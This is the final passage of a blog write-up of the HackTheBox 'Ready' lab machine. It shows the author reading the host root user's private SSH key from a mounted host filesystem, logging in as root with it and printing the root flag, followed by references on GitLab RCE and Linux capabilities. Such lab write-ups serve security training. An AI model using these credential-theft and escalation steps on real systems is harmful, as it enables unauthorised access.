</span></span><span class=line><span class=cl>bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   snap  sys  usr
</span></span><span class=line><span class=cl>boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   tmp  var
</span></span></code></pre></div><p>The root user of the host has SSH keys, I’ll grab only the private key to my machine.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>root@gitlab:/media# ls -l iamf/root/.ssh/ 
</span></span><span class=line><span class=cl>total <span class=m>12</span>
</span></span><span class=line><span class=cl>-rw------- <span class=m>1</span> root root  <span class=m>405</span> Dec  <span class=m>7</span> 16:49 authorized_keys
</span></span><span class=line><span class=cl>-rw------- <span class=m>1</span> root root <span class=m>1675</span> Dec  <span class=m>7</span> 16:49 id_rsa
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> root root  <span class=m>405</span> Dec  <span class=m>7</span> 16:49 id_rsa.pub
</span></span><span class=line><span class=cl>root@gitlab:/media# cat iamf/root/.ssh/id_rsa
</span></span><span class=line><span class=cl>-----BEGIN RSA PRIVATE KEY-----
</span></span><span class=line><span class=cl>MIIEowIBAAKCAQEAvyovfg++zswQT0s4YuKtqxOO6EhG38TR2eUaInSfI1rjH09Q
</span></span><span class=line><span class=cl>sle1ivGnwAUrroNAK48LE70Io13DIfE9rxcotDviAIhbBOaqMLbLnfnnCNLApjCn
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span><span class=line><span class=cl>vJzok/kcmwcBlGfmRKxlS0O6n9dAiOLY46YdjyS8F8hNPOKX6rCd
</span></span><span class=line><span class=cl>-----END RSA PRIVATE KEY-----
</span></span></code></pre></div><h4 id=ssh-access---root-host>SSH Access - root (host)<a class=anchor aria-hidden=true href=#ssh-access---root-host>#</a></h4><p>After changing the key permissions to 600, I can login as root user.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «exploit» «10.10.14.20» 
</span></span><span class=line><span class=cl>$ ssh -i root_rsa root@10.10.10.220
</span></span><span class=line><span class=cl>Welcome to Ubuntu 20.04 LTS <span class=o>(</span>GNU/Linux 5.4.0-40-generic x86_64<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;..
</span></span><span class=line><span class=cl>  System load:                      0.05
</span></span><span class=line><span class=cl>  Usage of /:                       67.1% of 17.59GB
</span></span><span class=line><span class=cl>  Memory usage:                     84%
</span></span><span class=line><span class=cl>  Swap usage:                       4%
</span></span><span class=line><span class=cl>  Processes:                        <span class=m>434</span>
</span></span><span class=line><span class=cl>  Users logged in:                  <span class=m>0</span>
</span></span><span class=line><span class=cl>  IPv4 address <span class=k>for</span> br-bcb73b090b3f: 172.19.0.1
</span></span><span class=line><span class=cl>  IPv4 address <span class=k>for</span> docker0:         172.17.0.1
</span></span><span class=line><span class=cl>  IPv4 address <span class=k>for</span> ens160:          10.10.10.220
</span></span><span class=line><span class=cl>  IPv6 address <span class=k>for</span> ens160:          dead:beef::250:56ff:feb9:211
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;..
</span></span><span class=line><span class=cl>Last login: Thu Feb <span class=m>11</span> 14:28:18 <span class=m>2021</span>
</span></span><span class=line><span class=cl>root@ready:~# id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>
</span></span></code></pre></div><p>I can also grab the root flag.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>root@ready:~# cut -c-15 root.txt 
</span></span><span class=line><span class=cl>b7f98681505cd39
</span></span></code></pre></div><div class=post-references><h2>References</h2><ul><li><a href=https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/ target=_blank rel="noopener noreferrer">https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/</a></li><li><a href=https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities target=_blank rel="noopener noreferrer">https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities</a></li></ul></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/linux/>Linux</a></li><li><a href=https://fahmifj.github.io/tags/gitlab/>GitLab</a></li><li><a href=https://fahmifj.github.io/tags/cve-2018-19571/>CVE-2018-19571</a></li><li><a href=https://fahmifj.github.io/tags/cve-2018-19585/>CVE-2018-19585</a></li><li><a href=https://fahmifj.github.io/tags/ssrf/>SSRF</a></li><li><a href=https://fahmifj.github.io/tags/crlf-injection/>CRLF-injection</a></li><li><a href=https://fahmifj.github.io/tags/command-injection/>Command-injection</a></li><li><a href=https://fahmifj.github.io/tags/docker/>Docker</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Ready on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20Ready&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fready%2f&hashtags=Linux%2cGitLab%2cCVE-2018-19571%2cCVE-2018-19585%2cSSRF%2cCRLF-injection%2cCommand-injection%2cDocker"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Ready on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fready%2f&title=HackTheBox%20-%20Ready&summary=HackTheBox%20-%20Ready&source=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fready%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Ready on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fready%2f&title=HackTheBox%20-%20Ready"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Ready on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fready%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Ready on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20Ready%20-%20https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fready%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Ready on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20Ready&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fready%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></div></main><footer class=footer><span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a>&nbsp;&&nbsp;<a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>&nbsp;(mod)</span>
<span><span class=copyright>&copy; 2022&nbsp;<a href=https://fahmifj.github.io/about>Fahmi FJ</a></span>
&nbsp;·&nbsp;
<span class=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/>CC BY-NC-SA 4.0</a></span></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>